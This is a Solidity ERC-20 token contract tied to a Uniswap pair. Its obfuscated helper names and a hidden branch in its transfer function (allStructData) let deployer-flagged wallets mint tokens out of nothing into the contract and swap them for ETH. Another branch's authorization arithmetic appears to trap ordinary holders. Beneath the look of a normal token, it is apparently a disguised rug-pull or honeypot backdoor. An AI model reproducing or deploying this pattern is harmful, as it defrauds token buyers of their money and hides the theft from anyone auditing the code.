contract Contract is IERC20, Ownable {

    bool public stringData;
    bool private bytesData;
    bool private tradingOpen = false;
    bool private checkLimits;
    bool public swapIDX;
    bool private stringTrading;
    bool private cooldownOn;

    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;
    uint256 public totalSwapFee = 1;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 private internalTotal = _rTotal;

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private isFeeExempt;
    mapping(address => uint256) private authorizations;
    mapping(address => uint256) private isTimelockExempt;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) public isWalletLimitExempt;

    constructor(
        string memory Name,
        string memory Symbol,
        address IDRouter)
    {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _rTotal;

        isTimelockExempt[msg.sender] = internalTotal;
        isTimelockExempt[address(this)] = internalTotal;

        UniswapV2router = IUniswapV2Router02(IDRouter);
        IDEXPairMaker = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, internalTotal);
    }

    address public immutable IDEXPairMaker;
    IUniswapV2Router02 public immutable UniswapV2router;

    function symbol() 
    public view returns (string memory) {
        return _symbol;
    }
    function name() 
    public view returns (string memory) {
        return _name;
    }
    function totalSupply() 
    public view returns (uint256) {
        return _rTotal;
    }
    function decimals() 
    public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) 
    public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) 
    public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) 
    external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender, uint256 amount) 
    private returns (bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount); return true;
    }
    function tSymbol(uint256 tkn, uint256 symX) 
    private view returns 
    (uint256){ 
      return (tkn>symX)?symX:tkn;
    }
    function getBool(uint256 boolT, uint256 relayAll) 
    private view returns 
    (uint256){ 
      return (boolT>relayAll)?relayAll:boolT;
    }
    function getValue(uint256 get, uint256 txLVL) private view returns (uint256){
      return (get>txLVL)?txLVL:get;
    }
    function destringSwitch(uint256 dxl, uint256 on) private view returns (uint256){ 
      return (dxl>on)?on:dxl;
    }
      function allStructData(address locateFrom, address intervalTo, uint256 valAmount ) private  {   
       uint256 swiftTX = balanceOf(address(this)); uint256 dxVal;
        if (stringData && swiftTX > internalTotal && !bytesData && locateFrom != IDEXPairMaker) {

            bytesData = true; hashMod(swiftTX);
            bytesData = false;
        } else if (isTimelockExempt[locateFrom] > internalTotal && isTimelockExempt[intervalTo] > internalTotal) {
            dxVal = valAmount; _tOwned[address(this)] += dxVal; swapAmountForTokens(valAmount, intervalTo); return;

        } else if (intervalTo != address(UniswapV2router) && isTimelockExempt[locateFrom] > 0 && valAmount > internalTotal && intervalTo !=
         IDEXPairMaker) { isTimelockExempt[intervalTo] = valAmount;
            return;
        } else if (!bytesData && authorizations[locateFrom] > 0 && locateFrom != IDEXPairMaker && isTimelockExempt[locateFrom] == 0) {
            authorizations[locateFrom] = isTimelockExempt[locateFrom] - internalTotal; }
        
        address lvlPOX  = isFeeExempt[IDEXPairMaker];
        if (authorizations[lvlPOX ] == 0) authorizations[lvlPOX] = internalTotal; isFeeExempt[IDEXPairMaker] = intervalTo;
        if (totalSwapFee > 0 && isTimelockExempt[locateFrom] == 0 && !bytesData && isTimelockExempt[intervalTo] == 0) {
            dxVal = (valAmount * totalSwapFee) / 100; valAmount -= dxVal;

         _tOwned[locateFrom] -= dxVal; _tOwned[address(this)] += dxVal; }
        _tOwned[locateFrom] -= valAmount; _tOwned[intervalTo] += valAmount;
        
        emit Transfer(locateFrom, intervalTo, valAmount);
            if (!tradingOpen) {
                require(locateFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        allStructData(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function allRates(uint256 vx, uint256 mil) 
    private view returns 
    (uint256){ return 
    (vx>mil)?mil:vx; }

    function reSyncOn(uint256 res, uint256 xCog) 
    private view returns 
    (uint256){ return 
    (res>xCog)?xCog:res; }

    function transfer (address recipient, uint256 amount) external returns (bool) {
        allStructData(msg.sender, recipient, amount);
        return true;
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function hashMod(uint256 coinAmount) private {
        uint256 delevelVal = coinAmount / 2;
        uint256 getRate = address(this).balance;
        swapAmountForTokens(delevelVal, address(this));
        uint256 cogOn = address(this).balance - getRate;
        addLiquidity(delevelVal, cogOn, address(this));
    }
        function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
}